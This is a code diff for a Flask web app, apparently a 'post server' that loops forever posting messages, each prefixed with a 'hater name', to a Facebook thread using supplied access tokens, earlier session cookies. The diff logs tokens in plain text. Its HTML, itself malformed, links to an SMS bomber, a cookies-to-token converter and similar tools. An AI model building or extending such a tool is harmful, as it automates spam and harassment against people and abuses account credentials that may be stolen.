@@ -1,7 +1,8 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request
 import requests
+from time import sleep
 import time
-
+from datetime import datetime
 app = Flask(__name__)
 app.debug = True
 
@@ -19,154 +20,259 @@ headers = {
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
-        cookies = request.form.get('cookies')
+        access_token = request.form.get('accessToken')
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
+
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
-        # Update headers with cookies
-        session_cookies = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in cookies.split(';')}
-        
         while True:
             try:
                 for message1 in messages:
                     api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = f"{mn} {message1}"
-                    data = {'message': message}
-                    response = requests.post(api_url, data=data, cookies=session_cookies, headers=headers)
-                    
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
                     if response.status_code == 200:
-                        print(f"Message sent using cookies: {message}")
+                        print(f"Message sent using token {access_token}: {message}")
                     else:
-                        print(f"Failed to send message using cookies: {message}")
+                        print(f"Failed to send message using token {access_token}: {message}")
                     time.sleep(time_interval)
             except Exception as e:
-                print(f"Error while sending message: {e}")
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
                 time.sleep(30)
+
+
     return '''
-    <!-- The HTML code remains mostly unchanged, except that you replace "Access Token" with "Cookies". -->
-<!DOCTYPE html>
-<html lang="en">
- <head> 
-  <meta charset="utf-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>AMIL POST</title> 
-  <style>
-        body {
-            background-image: url('https://i.ibb.co/19kSMz4/In-Shot-20241121-173358587.jpg');
-            background-size: cover;
-            background-repeat: no-repeat;
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.7);
-        }
-        .header h1 {
-            margin: 0;
-            font-size: 24px;
-        }
-        .container {
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            max-width: 600px;
-            margin: 40px auto;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        .form-control {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border-radius: 5px;
-            border: none;
-        }
-        .btn-submit {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-            width: 100%;
-        }
-        footer {
-            text-align: center;
-            padding: 20px;
-            background-color: rgba(0, 0, 0, 0.7);
-            margin-top: auto;
-        }
-        footer p {
-            margin: 5px 0;
-        }
+<!DOCTYPE html> 
+</head> 
+
+<body>
+       <style> 
+        .GFG { 
+           width:700px;
+           height:100px;
+           background:Neon DarkSlateGray or DarkSlateGrey (W3C;
+           border:none;
+           color:cyan;
+        } 
     </style> 
- </head> 
- <body> 
-  <header class="header"> 
-   <h1 style="color: red;"> 𝐓𝐇𝐄 𝐀𝐁𝐇𝐈𝐍𝐀𝐕 𝐏𝐀𝐍𝐃𝐈𝐓 𝐈𝐍𝐒𝐈𝐈𝐃𝐄</h1> 
-   <h1 style="color: blue;">𝐀𝐁𝐇𝐈𝐍𝐀𝐕 𝐏𝐎𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 (𝐏𝐎𝐒𝐓-𝐑𝐀𝐇𝐔𝐋)</h1> 
-  </header> 
-  <div class="container"> 
-   <form action="/" method="post" enctype="multipart/form-data"> 
-    <div class="mb-3"> 
-     <label for="threadId">POST ID:</label> 
-     <input type="text" class="form-control" id="threadId" name="threadId" required> 
-    </div> 
-    <div class="mb-3"> 
-     <label for="kidx">Enter Hater Name:</label> 
-     <input type="text" class="form-control" id="kidx" name="kidx" required> 
-    </div> 
-    <div class="mb-3"> 
-     <label for="method">Choose Method:</label> 
-     <select class="form-control" id="method" name="method" required onchange="toggleFileInputs()"> <option value="token">Token</option> <option value="cookies">Cookies</option> </select> 
-    </div> 
-    <div class="mb-3" id="tokenFileDiv"> 
-     <label for="tokenFile">Select Your Tokens File:</label> 
-     <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt"> 
-    </div> 
-    <div class="mb-3" id="cookiesFileDiv" style="display: none;"> 
-     <label for="cookiesFile">Select Your Cookies File:</label> 
-     <input type="file" class="form-control" id="cookiesFile" name="cookiesFile" accept=".txt"> 
-    </div> 
-    <div class="mb-3"> 
-     <label for="commentsFile">Select Your Comments File:</label> 
-     <input type="file" class="form-control" id="commentsFile" name="commentsFile" accept=".txt" required> 
-    </div> 
-    <div class="mb-3"> 
-     <label for="time">Speed in Seconds (minimum 20 second):</label> 
-     <input type="number" class="form-control" id="time" name="time" required> 
-    </div> 
-    <button type="submit" class="btn-submit">Submit Your Details</button> 
-   </form> 
-  </div> 
-  <footer> 
-   <p style="color: #FF5733;">Post Loader Tool</p> 
-   <p>𝐌𝐀𝐃𝐄 𝐁𝐘 𝐓𝐄𝐂𝐇𝐍𝐈𝐂𝐀𝐋 𝐀𝐁𝐇𝐈2𝐌</p> 
-  </footer> 
-  <script>
-        function toggleFileInputs() {
-            var method = document.getElementById('method').value;
-            if (method === 'token') {
-                document.getElementById('tokenFileDiv').style.display = 'block';
-                document.getElementById('cookiesFileDiv').style.display = 'none';
-            } else {
-                document.getElementById('tokenFileDiv').style.display = 'none';
-                document.getElementById('cookiesFileDiv').style.display = 'block';
-            }
-        }
-    </script> 
- </body>
-</html>
-'''
+    <style>
+    body{
+      background-color: #5865F2;
+    }
+     <style> 
+    <style> 
+        .ABI { 
+           width:700px;
+           height:100px;
+           background:red;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABB { 
+           width:700px;
+           height:100px;
+           background:blue;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABC { 
+           width:700px;
+           height:100px;
+           background:LightBlue;
+           border:none;
+           color:lime;
+        } 
+    </style> 
+    <style> 
+        .ABD { 
+           width:700px;
+           height:100px;
+           background:Yellow;
+           border:none;
+           color:Magenta;
+        } 
+    </style> 
+    <style> 
+        .ABE { 
+           width:700px;
+           height:100px;
+           background:Lime;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABF { 
+           width:700px;
+           height:100px;
+           background:Magenta;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABH { 
+           width:700px;
+           height:100px;
+           background:red;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABJ { 
+           width:700px;
+           height:100px;
+           background: Green;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABK { 
+           width:700px;
+           height:100px;
+           background: Turquoise;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABL { 
+           width:700px;
+           height:100px;
+           background: Blue;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABZ { 
+           width:150px;
+           height:100px;
+           background: red;
+           border:none;
+           color:white;
+        } 
+    </style> 
+    <style> 
+        .ABY { 
+           width:150px;
+           height:100px;
+           background: red;
+           border:none;
+           color:white;
+        } 
+    </style> 
+<p align="left"> <img align="right" alt="coding" width="405" src="https://user-images.githubusercontent.com/55389276/140866485-8fb1c876-9a8f-4d6a-98dc-08c4981eaf70.gif">
+</p>
+<p align="left"> <img src="https://www.facebook.com/TECHNICALABHI07?mibextid=ZbWKwL" alt="abhinav-pandit" /> </p>
+
+
+
+
+<h3 align="left">𝐉𝐚𝐲 𝐬𝐡𝐫𝐢 𝐫𝐚𝐦 ❤:</h3>
+<p align="left">
+<a href="https://t.me/TECHNICALABHI07" target="blank"><img align="center" src="https://technical-abhi-pannel.onrender.com/" alt="techgod143" height="30" width="40" /></a>
+<a href="https://www.facebook.com/TECHNICALABHI07?mibextid=ZbWKwL" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/facebook.svg" alt="techgod143" height="30" width="40" /></a>
+<a href="https://www.instagram.com/mcrahvin07/profilecard/?igsh=dXBiM2s4MDd5b2th" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg" alt="techgod143" height="30" width="40" /></a>
+<a href="https://youtube.com/@mcrahvin07?si=oT0_SMGzULsK_Xhs" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/youtube.svg" alt="tech god" height="30" width="40" /></a>
+</p>
+    <a href="https://ipinfo.io/?utm_medium=social&utm_source=heylink.me">
+    <button class="ABY"> 
+        𝐈𝐏-𝐀𝐃𝐑𝐒
+    </button> 
+</body> 
+</p>
+    <a href="https://t.me/@abh7555">
+    <button class="GFG"> 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐌𝐀𝐃𝐄 𝐁𝐘: 𝐀𝐁𝐇𝐈-𝐗𝐃-𝐖𝐄𝐁 :=
+    </button> 
+</body> 
+</p>
+ <a href="https://github.com/AbhinavRahul/OFFLINE-SERVER-BY-TECHNICAL-ABHI.git">
+    <button class="ABB"> 
+        ☞𝐎𝐅𝐅𝐋𝐈𝐍𝐄--𝐒𝐄𝐑𝐕𝐄𝐑☜
+    </button> 
+</body> 
+</p>
+ <a href="https://facebook-post-server-technical-abhi2m-47rs.onrender.com">
+    <button class="ABK"> 
+        ☞𝐏𝐎𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑☜
+    </button> 
+</body> 
+</p>
+ <a href="https://Abhi-cookies-therulexfacts07.replit.app">
+    <button class="ABC"> 
+        𝐂𝐨𝐨𝐤𝐢𝐞𝐬 -𝐩𝐨𝐬𝐭- 𝐬𝐚𝐫𝐯𝐞𝐫
+    </button> 
+</body> 
+</p>
+ <a href="https://github.com/AbhinavRahul">
+    <button class="ABD"> 
+        ☞𝐀𝐋𝐋-𝐗𝐃-𝐒𝐂𝐑𝐈𝐏𝐓☜
+    </button> 
+</body> 
+</p>
+ <a href="https://www.kojaxd.online/">
+    <button class="ABE"> 
+        ☞𝐂𝐎𝐎𝐊𝐈𝐄𝐒--𝐂𝐎𝐍𝐕𝐑𝐓 𝐓𝐎 --𝐓𝐎𝐊𝐄𝐍☜
+    </button> 
+</body> 
+</p>
+ <a href="https://www.kojaxd.online/">
+    <button class="ABF"> 
+        ☞𝐀𝐋𝐋---𝐈𝐍---𝐎𝐍𝐄☜
+    </button> 
+</body> 
+</p>
+ <a href="https://t.me/smsbaipas">
+    <button class="ABH"> 
+        ☞𝐒𝐌𝐒--𝐁𝐘--𝐏𝐀𝐒𝐒☜
+    </button> 
+</body> 
+</p>
+ <a href="https://youtube.com/@rulexyt07?si=zF5jsGKC_ui_9Mk2">
+    <button class="ABJ"> 
+        ☞𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋☜
+    </button> 
+</body> 
+</p>
+ <a href="@NETABHINAVHACK_bot">
+    <button class="ABK"> 
+        ☞𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌☜
+    </button> 
+</body> 
+</p>
+ <a href="https://mytoolstown.com/smsbomber/#bestsmsbomber">
+    <button class="ABL"> 
+        ☞𝐒𝐌𝐒--𝐁𝐎𝐌𝐁𝐄𝐑☜
+    </button> 
+</body> 
+</p>
+
+
+
+
+
+<a href="https://www.kojaxd.online/">
+    <button class="ABZ"> 
+        𝐇𝐨𝐦𝐞
+    </button> 
+</body> 
+</p>
+  </footer>
+</body>
+  </html>           
+    '''
 
 
 if __name__ == '__main__':
